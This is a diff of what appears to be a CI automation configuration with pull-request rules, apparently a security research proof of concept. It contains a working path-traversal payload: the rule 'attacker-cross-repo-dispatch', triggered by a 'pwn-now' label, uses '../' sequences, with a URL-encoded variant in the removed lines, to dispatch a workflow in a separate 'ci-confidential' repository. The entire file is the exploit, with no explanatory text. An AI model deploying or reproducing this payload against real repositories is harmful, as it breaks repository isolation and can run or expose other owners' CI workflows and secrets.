@@ -1,19 +1,11 @@
 pull_request_rules:
-  - name: gha-traversal
+  - name: attacker-cross-repo-dispatch
     conditions:
       - base=main
-      - label=fire-gha
+      - label=pwn-now
     actions:
       github_actions:
         workflow:
           dispatch:
-            - workflow: "../../kirasec-research1/ci-confidential-30019349/actions/workflows/ci-insights-probe.yml"
-              ref: main
-            - workflow: "../../../kirasec-research1/ci-confidential-30019349/actions/workflows/ci-insights-probe.yml"
-              ref: main
             - workflow: "../../../../kirasec-research1/ci-confidential-30019349/actions/workflows/ci-insights-probe.yml"
-              ref: main
-            - workflow: "../../../../../kirasec-research1/ci-confidential-30019349/actions/workflows/ci-insights-probe.yml"
-              ref: main
-            - workflow: "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fkirasec-research1/ci-confidential-30019349/actions/workflows/ci-insights-probe.yml"
               ref: main
